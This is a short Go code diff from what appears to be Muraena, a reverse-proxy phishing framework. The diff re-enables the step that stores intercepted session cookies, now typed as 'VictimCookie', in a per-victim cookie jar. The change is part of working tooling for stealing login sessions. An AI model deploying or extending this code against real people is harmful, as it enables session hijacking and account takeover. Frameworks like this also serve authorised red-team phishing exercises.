@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
+	"github.com/muraenateam/muraena/core/db"
 	"io/ioutil"
 	"net/http"
 	"net/url"
@@ -16,7 +17,6 @@ import (
 
 	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/log"
-	"github.com/muraenateam/muraena/module/necrobrowser"
 	"github.com/muraenateam/muraena/module/statichttp"
 	"github.com/muraenateam/muraena/module/tracking"
 	"github.com/muraenateam/muraena/session"
@@ -287,7 +287,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 				c.Domain = response.Request.Host
 			}
 
-			sessCookie := necrobrowser.SessionCookie{
+			sessCookie := db.VictimCookie{
 				Name:     c.Name,
 				Value:    c.Value,
 				Domain:   c.Domain,
@@ -297,9 +297,8 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 				Secure:   c.Secure,
 			}
 
-			// TODO re-enable!
-			log.Info("%s", sessCookie)
-			// muraena.Tracker.AddToCookieJar(victim, sessCookie)
+			//log.Info("%s", sessCookie)
+			muraena.Tracker.AddToCookieJar(victim.ID, sessCookie)
 		}
 	} else {
 
